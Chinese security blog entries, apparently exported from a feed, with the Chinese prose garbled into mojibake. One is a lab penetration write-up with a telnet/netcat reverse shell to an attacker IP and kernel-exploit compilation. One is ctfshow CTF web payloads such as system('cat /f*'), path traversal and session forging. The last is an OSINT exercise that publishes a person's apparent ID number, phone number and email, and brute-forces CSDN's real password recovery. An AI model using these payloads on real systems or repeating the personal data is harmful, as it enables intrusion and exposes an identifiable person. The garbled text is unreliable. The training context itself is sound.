<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832353.png" alt="image-20230125152747414"></p>
<p>æœ‰userè¡¨ï¼Œç›´æ¥çœ‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832242.png" alt="image-20230125152801893"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832546.png" alt="image-20230125152812017"></p>
<p>æ‹¿åˆ°è´¦å·å¯†ç </p>
<p>è¿˜æœ‰å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832474.png" alt="image-20230125152912999"></p>
<p>å°è¯•ä¹‹åå‘ç°å¥½åƒæ²¡æœ‰å¯¹åç¼€è¿›è¡Œæ£€æµ‹ï¼Œè€Œæ˜¯å¯¹MIMEç±»å‹æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘æŒ‰è¦æ±‚ä¼ PNGæ–‡ä»¶ä»ç„¶æŠ¥é”™</p>
<p>ï¼ˆé—®è¿‡å­¦é•¿è¯´ä¸å½±å“åšé¢˜ï¼Œé‚£å°±dirbæ‰«ä¸€ä¸‹æœ‰ä»€ä¹ˆç›®å½•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832181.png" alt="image-20230125200554740"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833024.png" alt="image-20230125200604749"></p>
<p>èšå‰‘è¿ä¸€ä¸‹ï¼Œçœ‹çœ‹ç»ˆç«¯æƒé™</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833831.png" alt="image-20230125200635200"></p>
<p>æ²¡æƒé™ï¼Œçœ‹çœ‹hint</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833348.png" alt="image-20230125220516581"></p>
<p>åå¼¹ä¸ªshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¶æœº:</span><br><span class="line">mknod a p; telnet 192.168.11.128 2222 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line">æ”»å‡»æœº:</span><br><span class="line">netcat -lvvp 2222</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…æ›´è‡ªåŠ¨åŒ–ä¸€ç‚¹ï¼Œç”¨msf</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833636.png" alt="image-20230127144100412"></p>
<p>åˆ‡æ¢åˆ°åå°ç„¶åæ‰¾ä¸€ä¸‹æ¼æ´</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833328.png" alt="image-20230127145533096"></p>
<p>è¡¥å…¨ä¸€ä¸‹playload</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833735.png" alt="image-20230127145629323"></p>
<p>å¼€æ—¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833308.png" alt="image-20230127145654832"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833957.png" alt="image-20230127145730742"></p>
<p>æ‹¿åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834750.png" alt="image-20230127145855166"></p>
<p>ä¸‹è¾¹æ˜¯æ‰‹å·¥ææƒç„¶åå¤±è´¥çš„è¿‡ç¨‹ï¼Œè¿˜å¾—æ˜¯è„šæœ¬å°å­å¥½å½“</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833686.png" alt="image-20230126194943121"></p>
<p>è¯•è¯•å†…æ ¸æ¼æ´ç„¶åææƒ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833506.png" alt="image-20230125222934524"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834940.png" alt="image-20230125222947820"></p>
<p>ä¸Šé¢åŸºæœ¬éƒ½è¯•è¿‡äº†ï¼Œè¦ä¸å°±æ˜¯ç¼–è¯‘çš„æ—¶å€™å‡ºé—®é¢˜ï¼Œè¦ä¸å°±æ˜¯è¿è¡Œçš„æ—¶å€™å°±æŠ¥é”™</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834051.png" alt="image-20230126213257249"></p>
<p>å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/weixin_65527369/article/details/127973141">ã€æ—¥å¸¸è®°å½•ã€‘è§£å†³â€˜GLIBC_2.34â€˜ not foundï¼Œå¹¶ä¸”gccåˆ¶å®šglibcç‰ˆæœ¬ç¼–è¯‘_äººé—´ä½“ä½è²çš„åšå®¢-CSDNåšå®¢</a></p>
<p>åœ¨kaliæ”»å‡»æœºé‡æ–°ç¼–è¯‘ä¹‹åä¸Šä¼ åˆ°é¶æœº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -Wl,-rpath=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64&#x27;,-dynamic-linker=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/ld-linux-x86-64.so.2&#x27; -s 40762.c -o 40762 -lkeyutils</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œæ²¡å›æ˜¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834082.png" alt="image-20230127133929635"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>è€ƒæ ¸</tag>
      </tags>
  </entry>
  <entry>
    <title>è€ƒæ ¸-ç¤¾å·¥</title>
    <url>/2023/02/18/%E8%80%83%E6%A0%B8-%E7%A4%BE%E5%B7%A5/</url>
    <content><![CDATA[<p>qqç”¨base64è§£ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845662.png" alt="image-20230115021820488"></p>
<p>&#x3D;&#x3D;ã€‹<strong>3585956882</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845666.png" alt="image-20230115021918465"></p>
<p>æ°ä¸ªqqï¼Œæ²¡å•¥ä¸œè¥¿ï¼Œçœ‹åˆ°æ˜¯12æœˆ12æ—¥å±ç¾Šçš„ï¼Œåˆç†çŒœæµ‹ä¸€ä¸‹<strong>å‡ºç”Ÿå¹´æœˆ2003.12.12</strong></p>
<p>ç™¾åº¦æœä¸€ä¸‹åå­—å‘ç°è¿™ä¸ªä¸»é¡µ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845680.png" alt="image-20230115022151325"></p>
<p>åœ¨base64è§£ç ä¸€ä¸‹æ˜¯ä¸ªipåœ°å€:82.157.233.217</p>
<p>è¿›å»ä¸»é¡µæ‰¾åˆ°ä¸ªå¸–å­</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845799.png" alt="image-20230115022855052"></p>
<p>å¯çŸ¥<strong>çœŸå®å§“åæ‹¼éŸ³ç¼©å†™ä¸ºctz</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845709.png" alt="image-20230115023848828"></p>
<p>å›¾ç‰‡çš„exifä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845706.png" alt="image-20230115025609631"></p>
<p>æŸ¥äº†ä¸€ä¸‹è¿™ä¸ªåœ°ç‚¹åœ¨æµ·ä¸Šï¼Œå±ç”¨æ²¡æœ‰</p>
<p>æœ‰å‡ ä¸ªä¿¡æ¯ç‚¹ï¼šå¡”åƒæ˜¯è¥¿å®‰å¤§é›å¡”ï¼›å®¶ã€å¡”ã€é¥­åº—ä¸€æ¡ç›´çº¿ï¼›å®¶ç¦»é¥­åº—è¿‘ã€‚</p>
<p>å¯çŸ¥ï¼Œæ‹æ‘„è§’åº¦ä½äºå¤§é›å¡”ä¾§æ–¹ï¼Œæ‰€ä»¥å¯ä»¥æ’é™¤å‡ ä¸ªé¤é¥®ç‚¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845216.png" alt="image-20230115024435523"></p>
<p>è¥¿åŒ—å’Œä¸œå—çš„å°åŒºå’Œé¥­åº—éš”å¾—å¤ªè¿œäº†ï¼Œä¸åƒæ˜¯ä¸€é¦–çœŸæ²¡ç¡å°±åˆ°å¾—äº†ï¼Œå¤§æ‚¦åŸé‚£ä¸ªæ–¹å‘æ²¡æœ‰ä»€ä¹ˆä½å®…åŒºï¼Œåˆæ­¥è§‰å¾—æ˜¯åœ¨8å·ä½ç½®çš„è‚¯å¾·åŸºï¼Œ<strong>å®¶ä½ç§‘è£èŠ±å›­å°åŒº</strong></p>
<p>è¿›å»åå°çœ‹ï¼Œæç¤ºå¯†ç åœ¨robots.txté‡Œï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸ªå‹ç¼©åŒ…ã€‚</p>
<p>åšå®¢çš„å…¶ä»–å¸–å­é‡Œå‘äº†ä¸ªå¯†ç å­—å…¸ç”Ÿæˆå™¨ã€‚æŠŠå·²çŸ¥çš„ä¿¡æ¯å¡«è¿›å»å¾—åˆ°å¯†ç å­—å…¸ï¼Œå†æŠŠè¿™ä¸ªå­—å…¸ç”¨ä½œçˆ†ç ´çš„ï¼Œå¾—åˆ°å¯†ç <strong>CTZ2003.</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845205.png" alt="image-20230115140355486"></p>
<p>è¿›å…¥åå°æ‹¿åˆ°é‚®ç®±</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845221.png" alt="image-20230115142251161"></p>
<p><strong><a href="mailto:&#x33;&#x35;&#x38;&#53;&#57;&#53;&#54;&#56;&#x38;&#x32;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;">&#x33;&#x35;&#x38;&#53;&#57;&#53;&#54;&#56;&#x38;&#x32;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;</a></strong></p>
<p>æœ‰ä¸€ä¸ªç§å¯†çš„æ–‡ç« ï¼Œå†™çš„æ˜¯å››çº§æˆç»©ï¼Œæ‰“å¼€å¯¹æ¯”ä¸€ä¸‹ctz</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845220.png" alt="image-20230115143016638"></p>
<p><strong>çœŸå®å§“åé™ˆé“æŸ±</strong></p>
<p><strong>èº«ä»½è¯372522200312120019</strong></p>
<p>æ‰‹æœºå·è¯•è¯•ç”¨QQçš„æ‰¾å›</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845084.png" alt="image-20230115144420294"></p>
<p>åŒç†ï¼Œåœ¨csdnä¸Šè¾¹æ‰¾å›ä¸€ä¸‹ï¼Œå‘ç°ç»™å‡ºçš„ä¿¡æ¯æ›´å¤š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845622.png" alt="image-20230116014611515"></p>
<p>è¿™ä¸‹åªç”¨çŒœä¸­é—´å››ä½äº†</p>
<p>ç”¨burpçˆ†ç ´ä¸€ä¸‹è¿™ä¸­é—´çš„å››ä½æ•°ï¼Œç”±äºcsdnæ²¡å•¥éªŒè¯æœåŠ¡ï¼Œæ‰€ä»¥çˆ†èµ·æ¥ç‰¹åˆ«å®¹æ˜“</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845406.png" alt="image-20230116022527859"></p>
<p>å‘åˆ°intruderé‡Œï¼Œæ„é€ ä¸€ä¸‹payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845240.png" alt="image-20230116022558387"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846464.png" alt="image-20230116022606937"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846054.png" alt="image-20230116022439881"></p>
<p>è¿æ°”æ¯”è¾ƒå¥½ï¼Œä¸­é—´å››ä½ä¸åœ¨0001-0999ï¼Œè€Œä¸”1081ç¦»1000å¾ˆè¿‘ï¼Œcsdnæ²¡banæˆ‘</p>
<p><strong>æ‹¿ä¸‹æ‰‹æœºå·:15310815980</strong></p>
<p>å½©è›‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846981.png" alt="image-20230116015559155"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846864.png" alt="image-20230116015629824"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>è€ƒæ ¸</tag>
        <tag>ç¤¾å·¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowèœç‹—æ¯</title>
    <url>/2024/01/04/%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval($_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQç¾¤:&#x27;]]]][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091656155.png" alt="image-20230909165613083"></p>
<h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091708112.png" alt="image-20230909170813094"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091708492.png" alt="image-20230909170819468"></p>
<h2 id="æˆ‘çš„çœ¼é‡Œåªæœ‰"><a href="#æˆ‘çš„çœ¼é‡Œåªæœ‰" class="headerlink" title="æˆ‘çš„çœ¼é‡Œåªæœ‰$"></a>æˆ‘çš„çœ¼é‡Œåªæœ‰$</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br></pre></td></tr></table></figure>

<p>extract():å°†æ•°ç»„ä¸­å˜é‡å¯¼å…¥åˆ°ç¬¦å·è¡¨ï¼Œextract(array(â€œaâ€ &#x3D;&gt; â€œCatâ€))ç­‰ä»·äº$a&#x3D;â€Catâ€</p>
<p>ä¼ å…¥POSTçš„æ—¶å€™æœ¬æ¥å°±ä¼šå°†POSTå†…å®¹ä½œä¸ºæ•°ç»„ä¼ å…¥ï¼Œæœ¬è´¨å…¶å®å°±æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="string">&quot;_&quot;</span>=&gt;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;b&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;c&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;d&quot;</span>,<span class="string">&quot;d&quot;</span>=&gt;<span class="string">&quot;e&quot;</span>,<span class="string">&quot;e&quot;</span>=&gt;<span class="string">&quot;f&quot;</span>,<span class="string">&quot;f&quot;</span>=&gt;<span class="string">&quot;g&quot;</span>,<span class="string">&quot;g&quot;</span>=&gt;<span class="string">&quot;h&quot;</span>,<span class="string">&quot;h&quot;</span>=&gt;<span class="string">&quot;i&quot;</span>,<span class="string">&quot;i&quot;</span>=&gt;<span class="string">&quot;j&quot;</span>,<span class="string">&quot;j&quot;</span>=&gt;<span class="string">&quot;k&quot;</span>,<span class="string">&quot;k&quot;</span>=&gt;<span class="string">&quot;l&quot;</span>,<span class="string">&quot;l&quot;</span>=&gt;<span class="string">&quot;m&quot;</span>,<span class="string">&quot;m&quot;</span>=&gt;<span class="string">&quot;n&quot;</span>,<span class="string">&quot;n&quot;</span>=&gt;<span class="string">&quot;o&quot;</span>,<span class="string">&quot;o&quot;</span>=&gt;<span class="string">&quot;p&quot;</span>,<span class="string">&quot;p&quot;</span>=&gt;<span class="string">&quot;q&quot;</span>,<span class="string">&quot;q&quot;</span>=&gt;<span class="string">&quot;r&quot;</span>,<span class="string">&quot;r&quot;</span>=&gt;<span class="string">&quot;s&quot;</span>,<span class="string">&quot;s&quot;</span>=&gt;<span class="string">&quot;t&quot;</span>,<span class="string">&quot;t&quot;</span>=&gt;<span class="string">&quot;u&quot;</span>,<span class="string">&quot;u&quot;</span>=&gt;<span class="string">&quot;v&quot;</span>,<span class="string">&quot;v&quot;</span>=&gt;<span class="string">&quot;w&quot;</span>,<span class="string">&quot;w&quot;</span>=&gt;<span class="string">&quot;x&quot;</span>,<span class="string">&quot;x&quot;</span>=&gt;<span class="string">&quot;y&quot;</span>,<span class="string">&quot;y&quot;</span>=&gt;<span class="string">&quot;z&quot;</span>,<span class="string">&quot;z&quot;</span>=&gt;<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;aa&quot;</span>=&gt;<span class="string">&quot;bb&quot;</span>,<span class="string">&quot;bb&quot;</span>=&gt;<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;cc&quot;</span>=&gt;<span class="string">&quot;dd&quot;</span>,<span class="string">&quot;dd&quot;</span>=&gt;<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;xx&quot;</span>=&gt;<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;yy&quot;</span>=&gt;<span class="string">&quot;ta&quot;</span>,<span class="string">&quot;ta&quot;</span>=&gt;<span class="string">&quot;ad&quot;</span>,<span class="string">&quot;ad&quot;</span>=&gt;<span class="string">&quot;bba&quot;</span>,<span class="string">&quot;bba&quot;</span>=&gt;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;sh&quot;</span>=&gt;<span class="string">&quot;ls&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>å¤ªéº»çƒ¦äº†ï¼Œå†™ä¸ªçˆ†ç ´è„šæœ¬ï¼Œç”±äºphpä¸­å˜é‡åå¼€å¤´å¿…é¡»æ˜¯å­—æ¯æˆ–è€…_ï¼Œå°±æ‰‹åŠ¨åŠ ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line">url = <span class="string">&quot;http://localhost:9090/&quot;</span></span><br><span class="line">data = <span class="string">&quot;_=_0&amp;&quot;</span></span><br><span class="line">code = <span class="string">&quot;_34=system(&#x27;cat /f*&#x27;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    data = data + <span class="string">&quot;_&quot;</span> +<span class="built_in">str</span>(i) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">data = data + code</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>ç»“æœå°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_=_0&amp;_0=_1&amp;_1=_2&amp;_2=_3&amp;_3=_4&amp;_4=_5&amp;_5=_6&amp;_6=_7&amp;_7=_8&amp;_8=_9&amp;_9=_10&amp;_10=_11&amp;_11=_12&amp;_12=_13&amp;_13=_14&amp;_14=_15&amp;_15=_16&amp;_16=_17&amp;_17=_18&amp;_18=_19&amp;_19=_20&amp;_20=_21&amp;_21=_22&amp;_22=_23&amp;_23=_24&amp;_24=_25&amp;_25=_26&amp;_26=_27&amp;_27=_28&amp;_28=_29&amp;_29=_30&amp;_30=_31&amp;_31=_32&amp;_32=_33&amp;_33=_34&amp;_34=system(&quot;cat /f*&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="æŠ½è€å©†"><a href="#æŠ½è€å©†" class="headerlink" title="æŠ½è€å©†"></a>æŠ½è€å©†</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091810331.png" alt="image-20230909181013311"></p>
<p>ä¸€çœ¼è·¯å¾„ï¼Œéšä¾¿è¯•ä¸€ä¸‹æœ‰æŠ¥é”™app.py</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091810892.png" alt="image-20230909181033871"></p>
<p>&#x2F;download?file&#x3D;..&#x2F;..&#x2F;app.pyæ‹¿åˆ°æºä»£ç +skï¼Œç›´æ¥sessionä¼ªé€ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27; -t &#x27;&#123;&quot;isadmin&quot;:&quot;True&quot;&#125;&#x27; </span><br></pre></td></tr></table></figure>

<h2 id="ä¸€è¨€æ—¢å‡º"><a href="#ä¸€è¨€æ—¢å‡º" class="headerlink" title="ä¸€è¨€æ—¢å‡º"></a>ä¸€è¨€æ—¢å‡º</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>å­¦åˆ°äº†ï¼Œå¼±æ¯”è¾ƒæ¯”è¾ƒæ•°å­—ï¼Œåªä¼šæ¯”å¯¹å•æ•°å­—çš„éƒ¨åˆ†ï¼Œasserté‡Œå¯ä»¥ç›´æ¥è§†ä½œphpè¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥ç”¨);&#x2F;&#x2F;é—­åˆç„¶åæŠŠåé¢çš„dieæ³¨é‡Šæ‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514);//</span><br></pre></td></tr></table></figure>

<h2 id="é©·é©¬éš¾è¿½"><a href="#é©·é©¬éš¾è¿½" class="headerlink" title="é©·é©¬éš¾è¿½"></a>é©·é©¬éš¾è¿½</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">     if ($_GET[&#x27;num&#x27;] == 114514 &amp;&amp; check($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">              assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;);</span><br><span class="line">              echo $flag;</span><br><span class="line">     &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">  return !preg_match(&quot;/[a-z]|\;|\(|\)/&quot;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°phpç‰ˆæœ¬åº”è¯¥æœ‰é—®é¢˜ï¼Œassertä¸ç®¡æ€ä¹ˆæ ·éƒ½æ˜¯true</p>
<p>ä½†æ˜¯è¿™ä¸ªintvalæ˜¯å¯ä»¥ç”¨+-*&#x2F;çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514%2b1805296(+ç¼–ç ä¸º%2b)</span><br></pre></td></tr></table></figure>

<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309092235912.png" alt="image-20230909223548862"></p>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Webshell &#123;</span><br><span class="line">    public $cmd = &#x27;echo &quot;Hello World!&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function init() &#123;</span><br><span class="line">        if (!preg_match(&#x27;/flag/i&#x27;, $this-&gt;cmd)) &#123;</span><br><span class="line">            $this-&gt;exec($this-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function exec($cmd) &#123;</span><br><span class="line">        $result = shell_exec($cmd);</span><br><span class="line">        echo $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ezååºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:15:&quot;cat f* | base64&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="åŒ–é›¶ä¸ºæ•´"><a href="#åŒ–é›¶ä¸ºæ•´" class="headerlink" title="åŒ–é›¶ä¸ºæ•´"></a>åŒ–é›¶ä¸ºæ•´</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$result=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">for ($i=1;$i&lt;=count($_GET);$i++)&#123;</span><br><span class="line">    if (strlen($_GET[$i])&gt;1)&#123;</span><br><span class="line">        die(&quot;ä½ å¤ªé•¿äº†ï¼ï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    $result=$result.$_GET[$i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($result ===&quot;å¤§ç‰›&quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŒºæœ‰æ„æ€çš„ï¼Œåœ¨phpä¸­ï¼Œä¸€ä¸ªä¸­æ–‡å­—çš„lenæ˜¯3ï¼Œæ‰€ä»¥è¦æŠŠä¸€ä¸ªä¸­æ–‡æ‹†æˆä¸‰åˆ†ç„¶åé€šè¿‡ <strong>.</strong> æ‹¼æ¥èµ·æ¥ã€‚ä½†æ˜¯ä¸€ç›´ä¸çŸ¥é“è¦æ€ä¹ˆæ‹†åˆ†ï¼Œçœ‹äº†wpæ‰çŸ¥é“æ˜¯ç”¨urlç¼–ç ï¼Œæ‰€ä»¥å°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>

<h2 id="æ— ä¸€å¹¸å…"><a href="#æ— ä¸€å¹¸å…" class="headerlink" title="æ— ä¸€å¹¸å…"></a>æ— ä¸€å¹¸å…</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class="line">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class="line">    if ($arr[]=1)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å•Šï¼Ÿ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0</span><br></pre></td></tr></table></figure>

<p>å…¶å®æ˜¯é¢˜ç›®æœ‰é—®é¢˜ï¼Œæœ¬æ¥åº”è¯¥æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($arr[]=1)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å¯¹$arr[]è¿›è¡Œä¸€ä¸ªèµ‹å€¼ï¼Œå¦‚æœä¸è¿›è¡Œç‰¹æ®Šæ“ä½œæ˜¯æ’ä¸ºçœŸçš„ï¼Œæ‰€ä»¥è¦è®©è¿™ä¸ªèµ‹å€¼æ“ä½œä¸­æ–­</p>
<p>ä¸­æ–­åŸç†å°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç´¢å¼•æ•°ç»„æœ€å¤§ä¸‹æ ‡ç­‰äºæœ€å¤§intæ•°ï¼Œå¯¹å…¶è¿½åŠ ä¼šå¯¼è‡´æ•´å‹æ•°æº¢å‡ºï¼Œè¿›è€Œå¼•èµ·è¿½åŠ å¤±è´¥</span><br><span class="line">intèŒƒå›´æŸ¥é˜…Manualå¯çŸ¥ï¼š32ä½æœ€å¤§æ˜¯231-1ï¼Œ64ä½æ˜¯263-1</span><br><span class="line">ä¹Ÿå°±æ˜¯2147483647ä¸9223372036854775807</span><br><span class="line">https://blog.csdn.net/Xxy605/article/details/120049069</span><br></pre></td></tr></table></figure>

